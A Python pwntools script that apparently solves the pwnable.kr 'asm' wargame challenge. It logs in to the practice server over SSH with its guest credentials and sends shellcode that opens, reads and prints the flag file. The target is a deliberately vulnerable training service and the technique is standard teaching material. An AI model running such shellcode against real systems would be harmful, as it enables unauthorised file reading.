from pwn import *

# context.log_level = "DEBUG"
context.arch = "amd64"

ssh_con = ssh("asm", "pwnable.kr", port=2222, password="guest")
p = ssh_con.connect_remote("localhost", 9026)

buf = 0x41414000

shellcode = ""
shellcode += shellcraft.pushstr("this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong")
shellcode += shellcraft.open("rsp", 0, 0)
shellcode += shellcraft.read("rax", buf, 100)
shellcode += shellcraft.write(1, buf, 100)

p.sendlineafter("shellcode: ", asm(shellcode))
success("SUCCESS! FLAG IS : " + p.recvuntil("\n", drop=True))

p.interactive()